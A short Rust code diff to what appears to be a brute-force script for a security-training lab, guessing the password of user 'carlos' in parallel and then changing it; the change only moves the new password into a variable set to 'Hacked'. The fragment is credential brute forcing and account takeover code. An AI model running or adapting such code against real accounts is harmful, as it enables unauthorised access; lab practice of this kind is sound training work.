@@ -62,6 +62,7 @@ fn main() {
         "[#] Brute forcing password of".white().bold(),
         "carlos".green().bold()
     );
+    let new_password = "Hacked"; // change this to what you want
     let passwords_count = passwords.len();
     passwords_chunks.par_iter().for_each(|minilist| {
         for password in minilist.iter() {
@@ -80,7 +81,7 @@ fn main() {
                                 &session,
                                 "carlos",
                                 password,
-                                "lol", // chagne the current password to this one
+                                new_password,
                             );
                             if let Ok(change_password_res) = change_password {
                                 if change_password_res.status().as_u16() == 200 {
@@ -94,7 +95,7 @@ fn main() {
                                     println!(
                                         "[#] {}: {}",
                                         "Password changed to".white().bold(),
-                                        "lol".green().bold()
+                                        new_password.green().bold()
                                     );
                                     break;
                                 } else {
